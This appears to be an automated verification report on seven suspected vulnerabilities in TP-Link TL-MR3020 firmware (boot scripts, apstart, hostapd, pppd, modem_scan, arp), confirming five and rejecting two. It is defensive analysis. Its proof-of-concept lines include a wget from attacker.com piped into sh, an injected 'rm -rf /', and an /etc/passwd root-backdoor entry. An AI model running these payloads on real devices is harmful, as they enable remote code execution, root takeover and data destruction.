# TL-MR3020_V1_150921 - Verification Report (7 findings)

---

## Original Information

- **File/Directory Path:** `etc/rc.d/rc.modules`
- **Location:** `Files: rc.modules and rcS in /etc/rc.d/`
- **Description:** The 'rc.modules' script is world-writable (permissions: -rwxrwxrwx), allowing any non-root user to modify its content. It is executed with root privileges during system boot via the 'rcS' script, which calls '/etc/rc.d/rc.modules' without any validation or boundary checks. An attacker with non-root access can inject malicious code (e.g., reverse shell or command execution) into 'rc.modules', which will run with root privileges upon the next boot or when 'rcS' is executed. This provides a direct path to privilege escalation and full system compromise. The trigger condition is system boot, and there are no constraints on the content of the modified script.
- **Code Snippet:**
  ```
  From rcS: "/etc/rc.d/rc.modules"
  From rc.modules: The script loads kernel modules but can be replaced with arbitrary code.
  ```
- **Notes:** This vulnerability is exploitable by any authenticated non-root user who can write to 'rc.modules'. Exploitation may require a system reboot to trigger, but it is feasible in scenarios where the attacker has persistent access. Recommended fixes include changing file permissions to root-only write (e.g., chmod 755) and adding integrity checks before execution. No additional files or functions were identified in this analysis that alter the exploit chain.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert description is completely accurate. Evidence shows: 1) The rc.modules file permissions are -rwxrwxrwx, writable by any non-root user; 2) The rcS script unconditionally executes '/etc/rc.d/rc.modules' during boot, without validation; 3) The rc.modules content can be arbitrarily replaced. Attacker model: An authenticated non-root user (with filesystem access). Vulnerability exploitability verification: Input is controllable (attacker can modify file content), path is reachable (automatically executed during system boot), actual impact (execution of arbitrary code with root privileges, leading to full system compromise). PoC steps: 1) Attacker logs in as a non-root user; 2) Executes 'echo "malicious_command" > /etc/rc.d/rc.modules' to replace file content (for example, adding '/bin/sh -c \'echo \"root::0:0:::/bin/sh\" >> /etc/passwd\'' to create a root backdoor, or setting up a reverse shell); 3) Waits for system reboot (or triggers a reboot); 4) Malicious code executes with root privileges, achieving privilege escalation. The vulnerability risk is high, as it can lead to persistent root access without requiring special conditions.

## Verification Metrics

- **Verification Duration:** 153.22 s
- **Token Usage:** 154804

---

## Original Information

- **File/Directory Path:** `sbin/apstart`
- **Location:** `File:apstart Function:fcn.00400c7c Address:0x00400c7c (Dangerous Operation Point); File:apstart Function:fcn.00400d0c Address:0x00400d0c (Data Flow Processing Point); File:apstart Function:fcn.00400a4c Address:0x00400a4c (Input Parsing Point)`
- **Description:** This vulnerability allows an attacker to execute arbitrary commands through a malicious topology file. An attacker as a non-root user (with valid login credentials) can control the topology file content, where the contained configuration values (such as bridge names, interface names) are directly used to build system command strings, lacking input validation and escaping. Trigger condition: When running apstart and specifying the topology file path, the file contains a command injection payload (for example, adding a semicolon or backtick in the configuration value to execute additional commands). Potential exploitation methods include executing system commands, escalating privileges, or compromising system integrity.
- **Code Snippet:**
  ```
  From the decompiled code, key snippets include:
    - In fcn.00400c7c: \`iVar1 = (**(loc._gp + -0x7f88))(param_1);\` (where param_1 is the command string, system() is called).
    - In fcn.00400d0c: Multiple uses of sprintf to build commands, such as \`(**(loc._gp + -0x7fbc))(auStack_f8,"ifconfig %s down",iVar17);\`, where iVar17 comes from the topology file.
    - In fcn.00400a4c: Parses file lines, but does not validate the safety of the content.
  ```
- **Notes:** This vulnerability relies on the controllability of the topology file. It is recommended to further verify file permissions and access controls in the actual environment. Associated functions include main (entry point) and system calls. Subsequent analysis directions include checking other input points (such as network interfaces) and component interactions.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert is accurately described. Evidence from the code analysis confirms that:
- In fcn.00400d0c, user-controlled input from the topology file (e.g., bridge names, interface names) is directly used in sprintf calls to build command strings (e.g., at addresses 0x00401844 with 'ifconfig %s down', 0x004018b4 with 'brctl delbr %s', and others). No input validation or escaping is performed.
- In fcn.00400c7c, the constructed command strings are passed to system() for execution (at address 0x00400cbc).
- The attack model assumes a non-root user with valid login credentials can control the topology file content. When apstart is executed with a malicious topology file, command injection occurs, allowing arbitrary command execution.

Proof of Concept (PoC):
1. Create a topology file with a malicious payload in a configurable field, e.g., set a bridge name to 'eth0; touch /tmp/pwned'.
2. Run apstart with this topology file: './apstart malicious_topology.txt'.
3. This will execute a command like 'ifconfig eth0; touch /tmp/pwned down', which creates the file /tmp/pwned, demonstrating arbitrary command execution.

The vulnerability is exploitable due to the lack of input sanitization and the direct use of user input in system commands, leading to a high risk of privilege escalation or system compromise.

## Verification Metrics

- **Verification Duration:** 294.83 s
- **Token Usage:** 301068

---

## Original Information

- **File/Directory Path:** `sbin/hostapd`
- **Location:** `File:hostapd Address:0x437328-0x43732c Function:sym.wps_set_ap_ssid_configuration`
- **Description:** In the sym.wps_set_ap_ssid_configuration function, user-provided input (from the control interface) is directly used to construct the command string for a system() call (formatted as 'cfg wpssave %s'), without proper input validation or escaping. An attacker can execute arbitrary system commands by injecting malicious commands (such as semicolons or backticks). Trigger condition: An attacker sends a specially crafted WPS configuration command through hostapd's control interface. Potential attacks include obtaining root privileges, file system access, or network reconnaissance. The attack chain is complete: input point (control interface socket) → data flow (via sym.eap_wps_config_set_ssid_configuration call) → dangerous operation (system() call). Exploitation condition: The attacker needs permission to access the control interface (non-root user but with valid login credentials).
- **Code Snippet:**
  ```
  // In sym.wps_set_ap_ssid_configuration
  (**(loc._gp + -0x7ddc))(auStack_498, "cfg wpssave %s", uStackX_4); // uStackX_4 is user input
  uVar10 = 0;
  (**(loc._gp + -0x7948))(auStack_498); // Call system(auStack_498)
  ```
- **Notes:** Further verification is needed regarding the specific command format and access control of the control interface, but based on code analysis, an attacker with login credentials can access the control interface. Related function: sym.eap_wps_config_set_ssid_configuration is the direct caller, its input validation should be checked. Suggested follow-up analysis: Check the control interface command processing logic (e.g., sym.hostapd_ctrl_iface_receive) to confirm the attack vector. This vulnerability may affect all embedded devices using hostapd, especially those exposing the control interface.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert accurately describes a command injection vulnerability. The decompiled code shows that in the `sym.wps_set_ap_ssid_configuration` function, user input `param_2` (`uStackX_4`) is directly used to construct the command string for a `system()` call (formatted as 'cfg wpssave %s'), without any input validation or escaping. Key code evidence: `(**(loc._gp + -0x7ddc))(auStack_498, "cfg wpssave %s", uStackX_4);` followed by `(**(loc._gp + -0x7948))(auStack_498);` (equivalent to `system(auStack_498)`). Input controllability is confirmed through the call chain: `param_2` originates from `param_5` in `sym.eap_wps_config_set_ssid_configuration`, ultimately from user input via the control interface. Path reachability verified: The code logic reaches the `system` call during normal execution flow (no preconditions block it). The attacker model is an authenticated user (non-root) with access to the hostapd control interface. Actual impact: Arbitrary command execution can lead to root privilege escalation, file system access, or network reconnaissance. Reproducible PoC: An attacker sends a specially crafted WPS configuration command via the control interface, where `param_2` contains a command injection payload, such as `"; wget http://attacker.com/malicious.sh -O /tmp/malicious.sh; sh /tmp/malicious.sh;"`, which will download and execute a malicious script upon execution. Complete attack chain: Control interface input → `sym.eap_wps_config_set_ssid_configuration` → `sym.wps_set_ap_ssid_configuration` → `system()` call.

## Verification Metrics

- **Verification Duration:** 311.42 s
- **Token Usage:** 315614

---

## Original Information

- **File/Directory Path:** `usr/sbin/pppd`
- **Location:** `pppd:0x427e90 fcn.00427e90, pppd:0x428000 system call, pppd:0x428310 system call`
- **Description:** In the fcn.00427e90 and sym.sifdefaultroute functions, system calls are used to execute route management commands. The command strings are constructed via format strings and include user-controllable parameters (such as IP addresses). If an attacker can control these parameters (e.g., through malicious PPP configuration or network data), they can inject arbitrary commands. For example, in fcn.00427e90, the %s in the command 'route del -host %s dev %s' may contain shell metacharacters (such as ; or `), leading to the execution of additional commands. Trigger condition: These functions are called when pppd handles route updates, and the parameters come from untrusted sources (such as network input). Potential attack method: An attacker sends malicious PPP packets or configurations, injecting commands like '; rm -rf / ;' to delete files or perform other actions. Constraints: Parameters may undergo some validation, but no input filtering is shown in the code. Since pppd runs as root, successful exploitation will grant root privileges.
- **Code Snippet:**
  ```
  // In fcn.00427e90:
  (**(loc._gp + -0x7d90))(auStack_a4,"route del -host %s dev %s",uVar3,*(loc._gp + -0x7bd4));
  (**(loc._gp + -0x7824))(auStack_a4);
  // In sym.sifdefaultroute:
  (**(loc._gp + -0x7824))("route del default");
  (**(loc._gp + -0x7d90))(auStack_7c,"route add default gw %s dev ppp0",uVar3);
  (**(loc._gp + -0x7824))(auStack_7c);
  ```
- **Notes:** Need to verify whether parameters uVar3 and *(loc._gp + -0x7bd4) are user-controllable. It is recommended to check network data processing functions to confirm the input source. Related functions: fcn.00427e90, sym.sifdefaultroute, and network protocol processing functions.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert accurately describes a command injection vulnerability. Evidence comes from the disassembled code: In fcn.00427e90, sprintf is used to construct the command 'route del -host %s dev %s' and system is called to execute it, with parameters coming from inet_ntoa(s3) and the global variable obj.ifname; In sym.sifdefaultroute, 'route del default' is executed directly and sprintf is used to construct 'route add default gw %s dev ppp0' before calling system, with the parameter coming from inet_ntoa(s4). Parameters s3 and s4 are function inputs, potentially originating from PPP network data or configuration, which an attacker can control (e.g., IP addresses). There is no evidence of input filtering or escaping, so if the parameters contain shell metacharacters (such as ; or `), arbitrary commands can be injected. Path is reachable: pppd runs with root privileges and calls these functions when handling route updates. Complete attack chain: An attacker sends malicious PPP packets or configurations, setting the IP address to an injection payload (e.g., '; rm -rf / ;'). When pppd executes the route command, additional commands will be executed. PoC example: Set the IP address to '192.168.1.1; rm -rf / ;' in the PPP configuration. When fcn.00427e90 is triggered, it executes 'route del -host 192.168.1.1; rm -rf / ; dev ppp0', leading to file deletion or other malicious actions.

## Verification Metrics

- **Verification Duration:** 320.49 s
- **Token Usage:** 333193

---

## Original Information

- **File/Directory Path:** `usr/sbin/modem_scan`
- **Location:** `modem_scan: fcn.00401154 at addresses 0x004012d4-0x004012f4`
- **Description:** A command injection vulnerability exists where the user-controlled '-f' argument is passed directly to execl with '/bin/sh -c', enabling arbitrary command execution. The vulnerability is triggered when both '-d' and '-f' options are provided, with '-f' containing the malicious command. The code uses strncpy with a buffer size of 0x41 bytes (65 bytes) for the '-f' argument, truncating inputs longer than 64 bytes, but still allowing execution of shorter commands. An attacker can exploit this by crafting the '-f' argument to execute commands, potentially leading to further system compromise if combined with other vulnerabilities, though privileges are dropped to the current user.
- **Code Snippet:**
  ```
  0x004012d4      3c040040       lui a0, 0x40
  0x004012d8      3c050040       lui a1, 0x40
  0x004012dc      8f998064       lw t9, -sym.imp.execl(gp)   ; [0x401960:4]=0x8f998010
  0x004012e0      3c060040       lui a2, 0x40
  0x004012e4      24841b50       addiu a0, a0, 0x1b50        ; 0x401b50 ; "/bin/sh" ; str._bin_sh
  0x004012e8      24a51b58       addiu a1, a1, 0x1b58        ; 0x401b58 ; "sh" ; str.sh
  0x004012ec      24c61b5c       addiu a2, a2, 0x1b5c        ; 0x401b5c ; "-c" ; str._c
  0x004012f0      02403821       move a3, s2
  0x004012f4      0320f809       jalr t9
  0x004012f8      afa00010       sw zero, (var_10h)
  ```
- **Notes:** The binary was checked for permissions using 'ls -l modem_scan' and found to have standard user executable permissions (e.g., -rwxr-xr-x), indicating no special privileges like setuid. The vulnerability is directly exploitable by an authenticated user but does not escalate privileges beyond the user's own level. Further analysis could involve checking if 'modem_scan' is invoked by other system components with higher privileges, which might increase the risk.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `Medium`
- **Detailed Reason:** The security alert accurately describes a command injection vulnerability in 'usr/sbin/modem_scan'. The analysis confirms that:
- The user-controlled '-f' argument is passed directly to `execl("/bin/sh", "sh", "-c", s2, NULL)` in function `fcn.00401154` at addresses 0x004012d4-0x004012f4.
- The vulnerability is triggered when both '-d' and '-f' options are provided, as verified in the main function where argument parsing occurs.
- `strncpy` is used with a buffer size of 0x41 bytes (65 bytes) for the '-f' argument, truncating inputs longer than 64 bytes but allowing execution of shorter commands.
- The binary has standard user executable permissions (-rwxrwxrwx), indicating no special privileges, and privileges are dropped to the current user via `setuid` and `setgid` calls in `fcn.00401154`.
- The attack model is an authenticated local user who can control the '-f' argument. Exploitation requires the user to execute: `modem_scan -d <device> -f '<command>'`, where `<command>` is an arbitrary shell command (e.g., `modem_scan -d /dev/ttyS0 -f 'id; ls'` to execute 'id' and 'ls' commands).
- The risk is Medium because it allows arbitrary command execution but does not escalate privileges beyond the user's own level, and it requires local access. However, if combined with other vulnerabilities or misconfigurations, it could lead to further compromise.

## Verification Metrics

- **Verification Duration:** 326.34 s
- **Token Usage:** 355730

---

## Original Information

- **File/Directory Path:** `usr/arp`
- **Location:** `arp:0x00400e00 sym.getargs`
- **Description:** In the sym.getargs function, strcpy is used to copy user-input strings to a stack buffer without boundary checks, which may lead to stack buffer overflow. Attackers can trigger this vulnerability by providing specially crafted file content to the 'arp -f' command (for example, a file containing a long string). Trigger conditions include: using the 'arp -f <file>' command where the file content exceeds the stack buffer size. Potential exploitation methods include overwriting the return address or executing arbitrary code, but since the 'arp' binary does not have the setuid bit, attackers may not be able to escalate privileges and can only execute code under the current user's permissions. Constraints: The buffer size is dynamically allocated on the stack, but strcpy does not verify the length.
- **Code Snippet:**
  ```
  0x00400df8      8f998024       lw t9, -sym.imp.strcpy(gp)  ; [0x405040:4]=0x8f998010
  0x00400dfc      00000000       nop
  0x00400e00      0320f809       jalr t9
  ; strcpy is called, copying user input string to stack buffer
  ```
- **Notes:** The vulnerability exists and is triggerable, but the 'arp' binary permissions are -rwxrwxrwx (no setuid bit), so exploitation is likely limited to the current user's permissions. It is recommended to further verify actual exploitability, for example by testing whether the overflow overwrites the return address. Related file: sym.arp_file handles file input. Future analysis directions: Check for similar vulnerabilities in other functions (such as sym.arp_set) and evaluate if they run with higher privileges in specific contexts (such as via sudo).

## Verification Conclusion

- **Description Accuracy:** `inaccurate`
- **Is Real Vulnerability:** `False`
- **Risk Level:** `N/A`
- **Detailed Reason:** The security alert description is inaccurate. In the 'sym.getargs' function, the stack buffer size is dynamically calculated as (strlen(input) + 1 + 7) & ~7, which is always greater than or equal to the input string length (including the null terminator), so the strcpy call will not cause a stack buffer overflow. Input is read via fgets in 'sym.arp_file', limited to 1024 bytes, further preventing overflow. The attacker model is a local user providing a file via the 'arp -f <file>' command, but without the setuid bit, permissions are limited to the current user. The complete attack chain is not achievable because the code logic ensures the buffer size is sufficient. There is no practically exploitable vulnerability.

## Verification Metrics

- **Verification Duration:** 448.42 s
- **Token Usage:** 400439

---

## Original Information

- **File/Directory Path:** `usr/sbin/pppd`
- **Location:** `pppd:0x407f98 main`
- **Description:** In the main function, pppd reads the username and password from the /tmp/pppoe_auth_info file using the read function directly into a fixed-size buffer, but without performing bounds checking. If an attacker (non-root user) can write to or create the /tmp/pppoe_auth_info file (since the /tmp directory is typically writable), they can cause a buffer overflow by providing an overly long username or password. This could overwrite the return address or critical data on the stack, thereby executing arbitrary code. Trigger condition: pppd runs with root privileges (because the main function check requires root), and the /tmp/pppoe_auth_info file exists or can be controlled by the attacker. Potential attack method: the attacker creates a malicious file containing shellcode or address overwrites, triggering the overflow when pppd reads the file, potentially obtaining a root shell. Constraint: the buffer size is unknown, but the code does not show dynamic allocation or size checks, so a fixed-size buffer may exist.
- **Code Snippet:**
  ```
  iVar1 = (**(loc._gp + -0x7b18))("/tmp/pppoe_auth_info",0x4491a4);
  if (iVar1 == 0) {
      // error handling
  }
  piVar14 = *(loc._gp + -0x7f90);
  iVar4 = (**(loc._gp + -0x7af8))(*(loc._gp + -0x7d24),1,*piVar14,iVar1);
  if (iVar4 != *piVar14) {
      (**(loc._gp + -0x7c54))("read username error\n");
  }
  // similar for password reading
  ```
- **Notes:** The buffer size is not explicitly stated in the code; further verification of the buffer layout and exploitability is needed. Dynamic testing is recommended to confirm the overflow. Related function: main.

## Verification Conclusion

- **Description Accuracy:** `inaccurate`
- **Is Real Vulnerability:** `False`
- **Risk Level:** `Low`
- **Detailed Reason:** Verification revealed the following issues: 1) The alert claims the read function is used, but fread is actually used; 2) The alert claims the buffer is on the stack and can overwrite the return address, but the actual buffers obj.user and obj.passwd are global variables (addresses 0x4a7890 and 0x4a6690), located in the data segment, so overflow would not directly overwrite the stack return address; 3) Although the code lacks bounds checking, global buffer overflow is difficult to reliably exploit for code execution, requiring overwriting specific function pointers or data; 4) The attacker model (non-root user controls the file, pppd runs as root) is valid, but there is no evidence of buffer size and length control, preventing a complete attack chain. The vulnerability lacks practical exploitability.

## Verification Metrics

- **Verification Duration:** 472.66 s
- **Token Usage:** 468706

---

